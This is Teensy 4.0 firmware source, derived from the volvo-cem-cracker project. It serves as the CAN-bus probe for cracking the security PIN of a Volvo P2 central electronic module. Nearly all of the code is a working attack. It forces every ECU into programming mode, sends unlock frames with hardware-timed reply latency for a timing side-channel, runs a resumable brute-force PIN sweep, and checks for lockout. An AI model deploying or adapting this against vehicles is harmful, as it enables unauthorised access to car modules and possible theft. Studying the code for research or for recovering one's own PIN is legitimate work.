/*
 * SPDX-License-Identifier: GPL-3.0-or-later
 * Copyright (C) 2026 Jason Gainor
 * Derived from volvo-cem-cracker — Copyright (C) 2020, 2021 Vitaly Mayatskikh,
 * Christian Molson, Mark Dapoz — https://github.com/vtl/volvo-cem-cracker (GPL-3.0).
 *
 * cem_probe.ino — Teensy 4.0 probe/unlock server for the CEM PIN cracker.
 *
 *   Host (Python engine + web UI)  <--USB serial-->  THIS  <--CAN-->  CEM
 *
 * The host owns ALL the intelligence (which PINs to probe, the statistics, when to stop, the
 * UI). This firmware is the dumb-fast-accurate hands: it fires unlock frames on the CAN bus and
 * hardware-timestamps the CEM's reply latency on the MCU — the one thing that CANNOT live on the
 * host, because USB jitter (~1 ms) would swamp the sub-microsecond timing signal. A PC-side
 * USB/J2534 interface lacks the timing accuracy this attack needs; the MCU does not.
 *
 * FLASH-AND-GO: this sketch ships with working defaults for the Volvo P2 platform — no editing.
 * Build for "Teensy 4.0", flash, and point the web UI at the serial port. The host pushes the
 * bus speed (`S`) at connect, so you never touch this file to switch buses or cars.
 *
 * HARDWARE: Teensy 4.0 + 2x Bosch CF160 CAN transceivers (the standard vtl/volvo-cem-cracker rig).
 *   CAN1 = high-speed bus (500 kbps) — the CEM answers here at ECU id 0x50 (default at boot).
 *   CAN2 = medium-speed bus (125 kbps) — the slow body bus (ECU id 0x40). Same board.
 *   Wiring matches the vtl/volvo-cem-cracker pinout (CAN1 TX=22/RX=23).
 *
 * PROTOCOL CONSTANTS are from the public vtl method (arb-id 0x0FFFFE, the [0x50,0xBE,m0..m5]
 * unlock frame, reply byte[2]==0x00 == unlocked). The exact framing MUST be validated on the
 * bench before trusting a result — that is the one thing only real hardware can confirm. The
 * contribution here is the timing + line protocol + resumable batch sweep.
 *
 * LINE PROTOCOL (ASCII, one command per line, '\n'; matches transport.SerialTransport):
 *   S <speed>                     set CAN bitrate (500000|250000|125000) -> "S ok"
 *   G <us>                        set inter-attempt gap microseconds     -> "G ok"
 *   P <n> <16hex>                 fire n probes of one frame, timestamped -> "L <us> <us> ..."
 *   U <16hex>                     single unlock attempt                    -> "U 1" | "U 0"
 *   LP <n>                        lockout pre-flight: n wrong unlocks,    -> "LP <responded> <n>"
 *                                 report how many the CEM still answered
 *   BSWEEP <base16hex> <varpos> <order> <start>   batch brute-force sweep:
 *       base16hex = 8-byte template frame (gifts/known bytes already placed)
 *       varpos    = csv of MESSAGE-byte indices to iterate (0..7), e.g. "4,5,6,7"
 *       order     = "std" (BCD 00..99) for now
 *       start     = resume cursor (linear index into the product space)
 *     emits "P <idx>" progress periodically, then "H <16hex> <idx>" on the first unlock,
 *     or "D <tried>" when the space (or an 'X' abort byte) is reached.
 *
 * Build: Arduino IDE + Teensyduino, board "Teensy 4.0", USB type "Serial". Needs FlexCAN_T4
 * (https://github.com/tonton81/FlexCAN_T4). Flash, then point the UI at the serial port.
 */
#include <FlexCAN_T4.h>

FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> HSCAN;   // high-speed (500k): the CEM bus
FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_16> MSCAN;   // medium-speed (125k): the slow body bus

static const char     FW_VERSION[]  = "cem_probe-4";  // bump on ANY protocol change; the UI checks it
static const uint32_t UNLOCK_ARB_ID = 0x0FFFFE;    // extended (29-bit) TX id for the unlock frame
static const uint8_t  CEM_ECU_ID    = 0x50;        // CEM ecu id = data[0] of the request AND the reply
static const uint8_t  RESP_CMD      = 0xB9;        // CEM reply command to our 0xBE unlock = data[1]
static const uint8_t  REPLY_OK_BYTE = 2;           // reply byte[2]==0x00 => unlocked
static const uint32_t REPLY_TIMEOUT_US = 8000;     // give up waiting for a reply after this
// SAFETY WATCHDOG: if we are HOLDING programming mode (prog_hold) but the host has gone silent for
// this long, auto-exit prog mode (broadcast FF C8) so a host crash / Ctrl-C / closed terminal can
// never strand the car. Long MCU-side loops (BSWEEP, lockout) block loop() and so are naturally
// exempt — the watchdog only fires while loop() is idle-spinning between host commands; normal
// per-probe traffic keeps the timer fresh, so 10 s has huge margin against a false trip.
static const uint32_t PROG_WATCHDOG_MS = 10000;

uint32_t can_speed = 500000;
uint32_t gap_us    = 0;        // inter-attempt settle gap (raise if the CEM throttles)
bool     use_hs    = true;     // 500k -> CAN1, 125k -> CAN2

// ---- cycle-accurate microseconds (DWT counter; ~F_CPU resolution) -------------------------
static inline void cyccnt_begin() {
  ARM_DEMCR |= ARM_DEMCR_TRCENA;
  ARM_DWT_CTRL |= ARM_DWT_CTRL_CYCCNTENA;
}
static inline uint32_t cyccnt() { return ARM_DWT_CYCCNT; }
static inline float cycles_to_us(uint32_t c) { return (float)c / ((float)F_CPU / 1e6f); }

// ---- low-level send + timed wait-for-reply ------------------------------------------------
static bool send_frame(const uint8_t f[8]) {
  CAN_message_t m;
  m.id = UNLOCK_ARB_ID;
  m.flags.extended = 1;
  m.len = 8;
  for (int i = 0; i < 8; i++) m.buf[i] = f[i];
  return (use_hs ? HSCAN.write(m) : MSCAN.write(m)) != 0;
}

// Send one unlock frame; busy-wait for the CEM reply on UNLOCK_ARB_ID. Returns latency in
// cycles via *lat_cyc (0 if timed out) and whether reply byte[2]==0x00 (unlocked).
static bool probe_once(const uint8_t f[8], uint32_t *lat_cyc, bool *unlocked) {
  *unlocked = false; *lat_cyc = 0;
  CAN_message_t rx;
  // drain any stale frames first
  while (use_hs ? HSCAN.read(rx) : MSCAN.read(rx)) {}
  uint32_t t0 = cyccnt();
  if (!send_frame(f)) return false;
  uint32_t deadline = micros() + REPLY_TIMEOUT_US;
  while ((int32_t)(micros() - deadline) < 0) {
    if (use_hs ? HSCAN.read(rx) : MSCAN.read(rx)) {
      if (rx.len > REPLY_OK_BYTE && rx.buf[0] == CEM_ECU_ID && rx.buf[1] == RESP_CMD) {   // CEM unlock reply (any arb-id)
        *lat_cyc = cyccnt() - t0;
        *unlocked = (rx.buf[REPLY_OK_BYTE] == 0x00);
        return true;
      }
    }
  }
  return false;  // timeout (no reply)
}

// ---- programming mode: hold the bus quiet + the CEM responsive (auto-managed) --------------
// Volvo "all ECUs into programming mode" = broadcast {0xFF,0x86,..} on id 0xffffe. It silences
// normal bus chatter AND is the state in which the CEM answers unlock probes. The host engine is
// UNCHANGED: any probe/unlock/sweep auto-(re)enters prog mode and holds it; it lapses ~2s after
// activity stops, so the car returns to normal when the crack is idle.
static const uint8_t PROG_FRAME[8]  = {0xFF, 0x86, 0, 0, 0, 0, 0, 0};
static const uint8_t RESET_FRAME[8] = {0xFF, 0xC8, 0, 0, 0, 0, 0, 0};  // vtl "reset all ECUs" (exit)
static uint32_t prog_last_ms = 0;   // when we last broadcast a prog frame
static uint32_t prog_act_ms  = 0;   // when we last had cracking activity (gates loop() upkeep)
static uint32_t last_rx_ms   = 0;   // when we last received a host byte (drives the safety watchdog)
static bool     prog_hold    = false; // explicit PROGON hold (re-asserted in loop()) until PROGOFF

// Exit programming mode on BOTH buses (like vtl, which resets CAN_HS and CAN_LS): broadcast FF C8
// `times` times. Only ever called at exit / by the watchdog, so bringing up MS-CAN here is safe and
// also clears a prog-mode state that propagated to the slow body bus. Returns every module to normal.
static void broadcast_reset(int times) {
  MSCAN.begin(); MSCAN.setBaudRate(125000);     // ensure the LS body bus is up so FF C8 reaches it too
  CAN_message_t m; m.id = UNLOCK_ARB_ID; m.flags.extended = 1; m.len = 8;
  for (int i = 0; i < 8; i++) m.buf[i] = RESET_FRAME[i];
  for (int i = 0; i < times; i++) {
    if (use_hs) HSCAN.write(m);                 // the CEM (active) bus...
    MSCAN.write(m);                             // ...+ the LS body bus (when use_hs the active bus IS MS)
    delay(20);
    if (Serial.available() && Serial.read() == 'X') break;
  }
}

// Establish prog mode if it has lapsed: a ~1.5s rapid broadcast brings every module in. Cheap to
// call at the top of each command — it only does the long burst when prog mode isn't already held.
static void ensure_prog() {
  prog_act_ms = millis();
  if (millis() - prog_last_ms > 800) {                  // lapsed -> re-establish
    uint32_t deadline = millis() + 1500;
    while ((int32_t)(millis() - deadline) < 0) { send_frame(PROG_FRAME); delayMicroseconds(800); }
  }
  prog_last_ms = millis();
}
// Re-assert prog mode periodically inside long loops (every 250ms) so modules never drop out.
static inline void maintain_prog() {
  if (millis() - prog_last_ms >= 250) { send_frame(PROG_FRAME); prog_last_ms = millis(); }
}

// ---- serial helpers -----------------------------------------------------------------------
static char line[256];
static int  linelen = 0;

static int hexnib(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}
// parse 16 hex chars at *p into 8 bytes; returns chars consumed or -1
static int parse_frame(const char *p, uint8_t out[8]) {
  for (int i = 0; i < 8; i++) {
    int hi = hexnib(p[2 * i]), lo = hexnib(p[2 * i + 1]);
    if (hi < 0 || lo < 0) return -1;
    out[i] = (hi << 4) | lo;
  }
  return 16;
}
static inline uint8_t bcd(int i) { return ((i / 10) << 4) | (i % 10); }  // 0..99 -> BCD byte

static void apply_can_speed() {
  use_hs = (can_speed >= 250000);
  if (use_hs) { HSCAN.begin(); HSCAN.setBaudRate(can_speed); }
  else        { MSCAN.begin(); MSCAN.setBaudRate(can_speed); }
}

// ---- command handlers ---------------------------------------------------------------------
static void cmd_probe(char *args) {
  long n = strtol(args, &args, 10);
  while (*args == ' ') args++;
  uint8_t f[8];
  if (n <= 0 || parse_frame(args, f) < 0) { Serial.println("L"); return; }
  ensure_prog();
  Serial.print("L");
  for (long i = 0; i < n; i++) {
    maintain_prog();
    uint32_t lat; bool unl;
    if (probe_once(f, &lat, &unl)) { Serial.print(' '); Serial.print(cycles_to_us(lat), 2); }
    else                          { Serial.print(" -1"); }     // timeout sentinel
    if (gap_us) delayMicroseconds(gap_us);
  }
  Serial.println();
}

static void cmd_unlock(char *args) {
  uint8_t f[8];
  if (parse_frame(args, f) < 0) { Serial.println("U 0"); return; }
  ensure_prog();
  uint32_t lat; bool unl;
  bool got = probe_once(f, &lat, &unl);
  Serial.println(got && unl ? "U 1" : "U 0");
}

static void cmd_lockout(char *args) {
  long n = strtol(args, NULL, 10);
  if (n <= 0) n = 5000;
  uint8_t f[8] = {0x50, 0xBE, 0xDE, 0xAD, 0xBE, 0xEF, 0x55, 0xAA};  // deliberately wrong PIN
  ensure_prog();
  long responded = 0;
  for (long i = 0; i < n; i++) {
    maintain_prog();
    uint32_t lat; bool unl;
    if (probe_once(f, &lat, &unl)) responded++;
    if (gap_us) delayMicroseconds(gap_us);
    if (Serial.available() && Serial.read() == 'X') break;
  }
  // host reads: if responded << n, the CEM is throttling/locking out -> do NOT start the sweep
  Serial.print("LP "); Serial.print(responded); Serial.print(' '); Serial.println(n);
}

// BSWEEP <base16hex> <varpos-csv> <order> <start>
static void cmd_bsweep(char *args) {
  while (*args == ' ') args++;
  uint8_t base[8];
  if (parse_frame(args, base) < 0) { Serial.println("D 0"); return; }
  args += 16;
  while (*args == ' ') args++;
  // parse varpos csv
  int varpos[8], nvar = 0;
  while (*args && *args != ' ' && nvar < 8) {
    int p = strtol(args, &args, 10);
    if (p >= 0 && p < 8) varpos[nvar++] = p;
    if (*args == ',') args++;
  }
  while (*args == ' ') args++;
  // order token (only "std" supported here; host front-loads likely PINs via U/short BSWEEPs)
  while (*args && *args != ' ') args++;
  while (*args == ' ') args++;
  uint64_t start = strtoull(args, NULL, 10);

  // total = 100^nvar
  uint64_t total = 1;
  for (int i = 0; i < nvar; i++) total *= 100ULL;

  uint8_t f[8];
  for (int i = 0; i < 8; i++) f[i] = base[i];
  const uint64_t PROGRESS = 200000;
  ensure_prog();
  for (uint64_t idx = start; idx < total; idx++) {
    maintain_prog();
    // decompose idx into per-varpos BCD digits (last varpos varies fastest)
    uint64_t rem = idx;
    for (int i = nvar - 1; i >= 0; i--) {
      f[varpos[i]] = bcd((int)(rem % 100));
      rem /= 100;
    }
    uint32_t lat; bool unl;
    if (probe_once(f, &lat, &unl) && unl) {
      Serial.print("H ");
      for (int i = 0; i < 8; i++) { if (f[i] < 16) Serial.print('0'); Serial.print(f[i], HEX); }
      Serial.print(' '); Serial.println((unsigned long long)idx);
      return;
    }
    if (gap_us) delayMicroseconds(gap_us);
    if ((idx % PROGRESS) == 0) { Serial.print("P "); Serial.println((unsigned long long)idx); }
    if (Serial.available() && Serial.read() == 'X') { Serial.print("D "); Serial.println((unsigned long long)(idx - start)); return; }
  }
  Serial.print("D "); Serial.println((unsigned long long)(total - start));
}

// ---- bus diagnostics (read-only; bench bring-up) ------------------------------------------
// Report every unique arb-id seen, with std/ext flag + count. Distinguishes a dead/miswired
// bus (silence) from a live bus where the CEM just answers on a different id than we assume.
static void sniff_report(uint32_t ms, const char *line_tag, const char *done_tag) {
  const int CAP = 80;
  uint32_t ids[CAP]; uint32_t cnt[CAP]; uint8_t ext[CAP]; int nu = 0; uint32_t total = 0;
  CAN_message_t rx;
  uint32_t deadline = millis() + ms;
  while ((int32_t)(millis() - deadline) < 0) {
    if (use_hs ? HSCAN.read(rx) : MSCAN.read(rx)) {
      total++;
      int j = -1;
      for (int i = 0; i < nu; i++) if (ids[i] == rx.id && ext[i] == rx.flags.extended) { j = i; break; }
      if (j < 0 && nu < CAP) { j = nu++; ids[j] = rx.id; cnt[j] = 0; ext[j] = rx.flags.extended; }
      if (j >= 0) cnt[j]++;
    }
    if (Serial.available() && Serial.read() == 'X') break;
  }
  for (int i = 0; i < nu; i++) {
    Serial.print(line_tag); Serial.print(' '); Serial.print(ids[i], HEX);
    Serial.print(ext[i] ? " ext x" : " std x"); Serial.println(cnt[i]);
  }
  Serial.print(done_tag); Serial.print(' '); Serial.print(total); Serial.print(' '); Serial.println(nu);
}

// SNIFF <ms> — passive listen for <ms> (default 2000), report every id heard.
static void cmd_sniff(char *args) {
  long ms = strtol(args, NULL, 10);
  sniff_report(ms > 0 ? (uint32_t)ms : 2000, "ID", "SNIFFDONE");
}

// USNIFF <16hex> <ms> — fire ONE unlock frame, then sniff <ms> (default 200) reporting every id
// that answers. Reveals the CEM's real reply id regardless of our REPLY assumption.
static void cmd_usniff(char *args) {
  while (*args == ' ') args++;
  uint8_t f[8];
  if (parse_frame(args, f) < 0) { Serial.println("USNIFFDONE 0 0"); return; }
  args += 16;
  while (*args == ' ') args++;
  long ms = strtol(args, NULL, 10);
  CAN_message_t rx;
  while (use_hs ? HSCAN.read(rx) : MSCAN.read(rx)) {}   // drain stale frames
  send_frame(f);
  sniff_report(ms > 0 ? (uint32_t)ms : 200, "RID", "USNIFFDONE");
}

// URAW <16hex> <ms> — send ONE unlock, then dump every raw frame (microseconds-since-send, id,
// data bytes) for <ms> (default 80). Lets the host confirm the CEM reply by content [50 B9 ..].
static void cmd_uraw(char *args) {
  while (*args == ' ') args++;
  uint8_t f[8];
  if (parse_frame(args, f) < 0) { Serial.println("URAWDONE"); return; }
  args += 16;
  while (*args == ' ') args++;
  long ms = strtol(args, NULL, 10);
  if (ms <= 0) ms = 80;
  CAN_message_t rx;
  while (use_hs ? HSCAN.read(rx) : MSCAN.read(rx)) {}   // drain stale frames
  uint32_t t0 = micros();
  send_frame(f);
  uint32_t deadline = millis() + (uint32_t)ms;
  while ((int32_t)(millis() - deadline) < 0) {
    if (use_hs ? HSCAN.read(rx) : MSCAN.read(rx)) {
      Serial.print("F "); Serial.print(micros() - t0); Serial.print(' '); Serial.print(rx.id, HEX);
      for (int i = 0; i < rx.len; i++) { Serial.print(' '); if (rx.buf[i] < 16) Serial.print('0'); Serial.print(rx.buf[i], HEX); }
      Serial.println();
    }
  }
  Serial.println("URAWDONE");
}

// TXSTAT — transmit-health check. Fire a short burst of unlock frames, then read the CAN error
// state. If our TX actually reaches the live bus, other modules ACK it and TEC stays 0. If the
// TX line is dead (frames never leave the transceiver), every send is unACKed -> ACK_ERR set,
// TEC climbs, state -> Error Passive/Bus Off. This separates a TX wiring fault from a protocol one.
static void cmd_txstat(char *args) {
  (void)args;
  uint8_t f[8] = {CEM_ECU_ID, 0xBE, 0, 0, 0, 0, 0, 0};
  int ok = 0;
  for (int i = 0; i < 20; i++) { ok += send_frame(f) ? 1 : 0; delayMicroseconds(300); }
  delayMicroseconds(3000);
  CAN_error_t e;
  if (use_hs) HSCAN.error(e, false); else MSCAN.error(e, false);
  Serial.print("TXSTAT writes_ok "); Serial.print(ok); Serial.print("/20");
  Serial.print(" state="); Serial.print(e.state);
  Serial.print(" TEC="); Serial.print(e.TX_ERR_COUNTER);
  Serial.print(" REC="); Serial.print(e.RX_ERR_COUNTER);
  Serial.print(" ACK_ERR="); Serial.print(e.ACK_ERR);
  Serial.print(" BIT_ERR="); Serial.print(e.BIT0_ERR || e.BIT1_ERR);
  Serial.print(" FLTCONF="); Serial.println(e.FLT_CONF);
}

// ---- programming-mode diagnostics (manual; PROG_FRAME + auto-manager are defined up top) ---

// PROG <ms> — spam the prog-mode broadcast for <ms> (default 2000) to enter/hold programming mode.
static void cmd_prog(char *args) {
  long ms = strtol(args, NULL, 10);
  if (ms <= 0) ms = 2000;
  uint32_t deadline = millis() + (uint32_t)ms; uint32_t n = 0;
  while ((int32_t)(millis() - deadline) < 0) {
    send_frame(PROG_FRAME); n++;
    delayMicroseconds(800);
    if (Serial.available() && Serial.read() == 'X') break;
  }
  Serial.print("PROG done "); Serial.println(n);
}

// PROGON — explicitly enter programming mode and HOLD it (re-asserted in loop()) until PROGOFF.
static void cmd_progon(char *args) {
  (void)args;
  ensure_prog();                                 // ~1.5s establishment burst
  prog_hold = true;
  Serial.println("PROGON ok");
}

// PROGOFF — exit programming mode: broadcast the vtl reset-all-ECUs frame {0xFF,0xC8,..} on both
// buses, returning every module to normal operation (the clean alternative to a battery pull).
static void cmd_progoff(char *args) {
  (void)args;
  prog_hold = false; prog_act_ms = 0;            // stop holding / auto-maintaining
  broadcast_reset(50);
  Serial.println("PROGOFF done");
}

// PROGPROBE <n> <16hex> — full self-contained test: enter programming mode (~1.5s of broadcasts),
// then fire n timed unlock probes of the frame, re-asserting prog mode periodically. Reports
// latencies like P. If this yields real latencies where bare P gives -1, prog mode is the fix.
static void cmd_progprobe(char *args) {
  long n = strtol(args, &args, 10);
  while (*args == ' ') args++;
  uint8_t f[8];
  if (n <= 0 || parse_frame(args, f) < 0) { Serial.println("L"); return; }
  uint32_t deadline = millis() + 1500;
  while ((int32_t)(millis() - deadline) < 0) { send_frame(PROG_FRAME); delayMicroseconds(800); }
  Serial.print("L");
  for (long i = 0; i < n; i++) {
    if ((i % 8) == 0) send_frame(PROG_FRAME);   // hold programming mode during the burst
    uint32_t lat; bool unl;
    if (probe_once(f, &lat, &unl)) { Serial.print(' '); Serial.print(cycles_to_us(lat), 2); }
    else                          { Serial.print(" -1"); }
    if (gap_us) delayMicroseconds(gap_us);
  }
  Serial.println();
}

static void handle(char *l) {
  if (l[0] == 'S' && l[1] == ' ') { can_speed = strtoul(l + 2, NULL, 10); apply_can_speed(); Serial.println("S ok"); }
  else if (l[0] == 'G' && l[1] == ' ') { gap_us = strtoul(l + 2, NULL, 10); Serial.println("G ok"); }
  else if (l[0] == 'P' && l[1] == ' ') cmd_probe(l + 2);
  else if (l[0] == 'U' && l[1] == ' ') cmd_unlock(l + 2);
  else if (l[0] == 'L' && l[1] == 'P') cmd_lockout(l + 2);
  else if (!strncmp(l, "VERSION", 7)) { Serial.print("VERSION "); Serial.println(FW_VERSION); }
  else if (!strncmp(l, "BSWEEP ", 7)) cmd_bsweep(l + 7);
  else if (!strncmp(l, "USNIFF ", 7)) cmd_usniff(l + 7);
  else if (!strncmp(l, "URAW ", 5)) cmd_uraw(l + 5);
  else if (!strncmp(l, "TXSTAT", 6)) cmd_txstat(l + 6);
  else if (!strncmp(l, "PROGPROBE ", 10)) cmd_progprobe(l + 10);
  else if (!strncmp(l, "PROGOFF", 7)) cmd_progoff(l + 7);
  else if (!strncmp(l, "PROGON", 6)) cmd_progon(l + 6);
  else if (!strncmp(l, "PROG ", 5)) cmd_prog(l + 5);
  else if (!strncmp(l, "SNIFF", 5)) cmd_sniff(l + 5);
  else Serial.println("? unknown");
}

void setup() {
  Serial.begin(2000000);
  cyccnt_begin();
  apply_can_speed();
  last_rx_ms = millis();                            // arm the watchdog clock (disarmed until prog_hold)
  // boot banner: confirms the firmware is alive and at what default speed, with no editing.
  // The host re-sends `S <speed>` at connect, so this is just a sanity line for a serial monitor.
  Serial.print("# cem_probe ready (Volvo P2) "); Serial.print(FW_VERSION);
  Serial.print(" — default CAN ");
  Serial.print(can_speed); Serial.println(" bps on CAN1; host sets speed at connect");
}

void loop() {
  while (Serial.available()) {
    char c = Serial.read();
    last_rx_ms = millis();                         // host is alive -> feed the safety watchdog
    if (c == '\n' || c == '\r') {
      if (linelen) { line[linelen] = 0; handle(line); linelen = 0; }
    } else if (c == 'X' && linelen == 0) {
      // a stray BSWEEP abort token between commands (never a command char at position 0; note the
      // 'X' inside "TXSTAT" arrives with linelen>0 and is preserved) — drop it so it can't corrupt
      // the next command (e.g. eat a PROGOFF and leave the car in programming mode).
      continue;
    } else if (linelen < (int)sizeof(line) - 1) {
      line[linelen++] = c;
    }
  }
  if (prog_hold || millis() - prog_act_ms < 2000) maintain_prog();  // hold prog mode (explicit or mid-crack)
  // SAFETY WATCHDOG: holding prog mode but the host went silent -> auto-exit so the car can never be
  // stranded by a host crash / Ctrl-C / closed terminal. (BSWEEP/lockout block loop() and so are
  // exempt; they keep the car in prog mode by actively probing anyway, and reset on completion.)
  if (prog_hold && (millis() - last_rx_ms) > PROG_WATCHDOG_MS) {
    prog_hold = false; prog_act_ms = 0;             // stop holding FIRST (else maintain_prog re-enters)
    Serial.println("# WATCHDOG: host silent while holding programming mode -> auto-exit (FF C8)");
    broadcast_reset(50);
    Serial.println("PROGOFF done");
    last_rx_ms = millis();                          // re-arm
  }
}
